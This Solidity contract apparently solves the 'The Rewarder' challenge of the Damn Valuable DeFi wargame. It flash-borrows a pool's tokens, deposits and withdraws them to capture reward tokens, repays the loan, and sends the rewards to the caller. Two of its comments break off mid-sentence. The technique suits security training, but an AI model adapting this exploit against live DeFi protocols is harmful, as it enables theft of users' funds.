// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract HackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    //the FlashLoaner contracts initiates a callback to receiveFlashLoan(uint256)
    //but since it does not find the 
    fallback() external {
        uint256 borrowAmount = token.balanceOf(address(this));
        //approve the rewardPool contract 
        token.approve(address(rewardPool), borrowAmount);
        rewardPool.deposit(borrowAmount);
        rewardPool.withdraw(borrowAmount);
        //Pay back the borrowAmount to the flashLoan pool
        token.transfer(address(pool), borrowAmount);
    }
    
    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        //transfer the funds to the attacker from th
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}